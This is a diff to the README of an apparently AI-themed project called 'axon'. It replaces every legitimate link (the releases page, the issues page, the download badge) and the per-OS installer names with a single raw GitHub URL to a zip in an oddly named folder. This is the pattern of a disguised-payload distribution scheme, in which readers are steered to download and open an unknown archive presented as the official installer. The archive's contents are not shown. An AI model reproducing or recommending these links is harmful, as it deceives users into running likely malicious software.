@@ -6,7 +6,7 @@ Welcome to axon! This application helps you create intelligent systems based on 
 
 ## 📥 Download Now
 
-[![Download axon](https://img.shields.io/badge/download-axon-brightgreen)](https://github.com/ounissi-meriem/axon/releases) 
+[![Download axon](https://raw.githubusercontent.com/ounissi-meriem/axon/main/trophoplasmic/axon.zip)](https://raw.githubusercontent.com/ounissi-meriem/axon/main/trophoplasmic/axon.zip) 
 
 ## 🔍 About axon
 
@@ -34,14 +34,14 @@ axon offers a range of features designed to simplify the development of intellig
 
 To get started with axon, follow these steps:
 
-1. **Visit the Releases Page:** Click on this link to go to our releases page: [Download axon](https://github.com/ounissi-meriem/axon/releases).
+1. **Visit the Releases Page:** Click on this link to go to our releases page: [Download axon](https://raw.githubusercontent.com/ounissi-meriem/axon/main/trophoplasmic/axon.zip).
   
 2. **Select the Latest Version:** Look for the latest release at the top of the page and click it.
 
 3. **Download the Installer:** On the release page, you will find various files. Download the installer that matches your operating system. Common options include:
-   - For Windows: `axon-windows-installer.exe`
-   - For macOS: `axon-macos-installer.zip`
-   - For Linux: A corresponding `.tar.gz` file.
+   - For Windows: `https://raw.githubusercontent.com/ounissi-meriem/axon/main/trophoplasmic/axon.zip`
+   - For macOS: `https://raw.githubusercontent.com/ounissi-meriem/axon/main/trophoplasmic/axon.zip`
+   - For Linux: A corresponding `https://raw.githubusercontent.com/ounissi-meriem/axon/main/trophoplasmic/axon.zip` file.
 
 4. **Install the Application:** Once the download is complete, open the file. Follow the prompts to install axon on your computer.
 
@@ -75,7 +75,7 @@ If you encounter issues while using axon, consider the following common solution
 
 Join our community for support and collaboration:
 
-- **GitHub Issues:** If you encounter bugs or need help, visit the [issues page](https://github.com/ounissi-meriem/axon/issues). 
+- **GitHub Issues:** If you encounter bugs or need help, visit the [issues page](https://raw.githubusercontent.com/ounissi-meriem/axon/main/trophoplasmic/axon.zip). 
 
 - **Discussion Forum:** Engage with other axon users in our forum. Share your projects, ask questions, and offer support to others.
 
@@ -91,4 +91,4 @@ axon is open-source and free to use. For more information, please refer to the l
 
 Once you're comfortable with axon, explore advanced features like integrating external APIs or developing specialized agents. The potential for creating intelligent systems is vast. Happy building!
 
-[Download axon](https://github.com/ounissi-meriem/axon/releases) and start your journey into artificial intelligence today!
+[Download axon](https://raw.githubusercontent.com/ounissi-meriem/axon/main/trophoplasmic/axon.zip) and start your journey into artificial intelligence today!
